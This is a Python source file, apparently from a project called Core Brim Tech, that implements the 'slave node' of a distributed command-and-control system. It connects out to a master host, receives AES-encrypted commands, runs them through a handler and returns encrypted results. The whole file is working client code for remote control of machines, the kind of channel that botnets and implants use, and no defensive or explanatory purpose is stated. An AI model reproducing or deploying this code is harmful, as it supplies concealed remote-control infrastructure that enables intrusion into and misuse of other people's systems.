#!/usr/bin/env python3 
# -*- coding: utf-8 -*-"
"""
This file is part of the CBT (Core Brim Tech) project, https://www.corebrimtech.com

Copyright (c) 2024 | MOMODU KAMARA-KOLLEH

Distributed Command & Control - Slave Node
"""
import socket, json, time, base64
from Cryptodome.Cipher import AES

class C2Slave(object):
    """Slave node for distributed C2"""
    
    def __init__(self, master_host, master_port, encryption_key):
        self.master_host = master_host
        self.master_port = master_port
        self.encryption_key = base64.b64decode(encryption_key)
        self.connected = False
        self.sock = None
    
    def encrypt_message(self, message):
        """Encrypt message"""
        cipher = AES.new(self.encryption_key, AES.MODE_EAX)
        ciphertext, tag = cipher.encrypt_and_digest(json.dumps(message).encode())
        return base64.b64encode(cipher.nonce + tag + ciphertext).decode()
    
    def decrypt_message(self, encrypted):
        """Decrypt message"""
        data = base64.b64decode(encrypted)
        nonce = data[:16]
        tag = data[16:32]
        ciphertext = data[32:]
        cipher = AES.new(self.encryption_key, AES.MODE_EAX, nonce=nonce)
        return json.loads(cipher.decrypt_and_verify(ciphertext, tag))
    
    def connect(self):
        """Connect to master"""
        try:
            self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self.sock.connect((self.master_host, self.master_port))
            self.connected = True
            print(f"[Info] [AI] [C2] Connected to master {self.master_host}:{self.master_port}")
            return True
        except Exception as e:
            print(f"[Error] [AI] [C2] Connection failed: {e}")
            return False
    
    def listen(self, command_handler):
        """Listen for commands from master"""
        while self.connected:
            try:
                # Receive command length
                length_data = self.sock.recv(10)
                if not length_data:
                    break
                
                length = int(length_data.decode())
                encrypted = self.sock.recv(length).decode()
                command = self.decrypt_message(encrypted)
                
                print(f"[Info] [AI] [C2] Received command: {command['type']}")
                
                # Execute command
                result = command_handler(command)
                
                # Send result
                result_msg = {
                    'command_id': command['id'],
                    'result': result,
                    'timestamp': time.time()
                }
                encrypted_result = self.encrypt_message(result_msg)
                self.sock.sendall(f"{len(encrypted_result):010d}{encrypted_result}".encode())
                
            except Exception as e:
                print(f"[Error] [AI] [C2] Error: {e}")
                break
        
        self.connected = False
